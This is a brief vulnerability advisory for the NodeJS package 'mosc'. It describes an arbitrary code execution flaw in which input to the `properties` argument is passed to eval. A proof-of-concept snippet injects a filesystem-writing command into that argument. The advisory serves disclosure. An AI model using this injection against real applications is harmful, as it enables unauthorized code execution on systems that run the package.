# Overview

mosc is an a simple inline object model builder for NodeJS (A small port exists for client-side javascript).

This package is vulnerable to Arbitrary Code Execution. User input provided to `properties` argument is executed by the eval function, allowing code execution.

# Proof of Concept

```
var A = require("mosc");
var a = new A({});
var key = "";
var attack_code = "fs=require('fs');fs.writeFile('HACKED');"
var properties = "{a:*1*; " + attack_code + " //*}"

var a = a.parse_properties(key,properties,{},{})
```
